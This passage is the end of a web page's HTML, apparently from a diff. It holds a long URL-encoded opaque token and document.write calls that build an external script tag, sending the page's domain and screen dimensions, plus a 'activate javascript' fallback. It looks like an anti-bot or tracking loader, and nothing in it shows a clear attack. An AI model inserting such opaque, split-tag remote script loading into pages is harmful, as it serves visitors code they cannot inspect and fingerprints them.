"4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD0G5%2bR85rwR2T4qOiQXkq5Ca9X26vHFLYxMkjmFzXCFdA0G%2bqpq9RPTz9ptyLUm6AZ4vF%2b3jKTo0%2bAu4AX4sHCX51QdXbUxtbyD6RW2tjflZa0PBh27yh7Xj4qMTptjDlLjQ%2fqbOiHlSErVJblGOJV835YTIET7oYgz6LxHL0VwW3ywgOGriLKjbpaW3Gx%2fx0N%2bdJia777M6RGPRszCqXBRcpMFNLq78QlVopWS5VA0%2fWs39n7Kor1lbIBbLyQ1k5dAVBmZtpKB%2fyercow8APkvhed%2f2eZBT%2fJaQmbMSCpGIVNJuZk2CO5TsoLkNaWt5wZ0YAvAYyLPCJ%2f0G%2bLyKh1ZbEuI3rx6XEKG8EUn%2f7CriURRwPmXuBLL1%2ffVa5h90AiF6JzXzKP%2fFVUhJkFSXzpvk5fj4k5AcDCHwnATMSd6io1xc9328Ri0ao9trFcdDUDGgKm%2bSLw1%2fJ20rC7Ecgfs");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
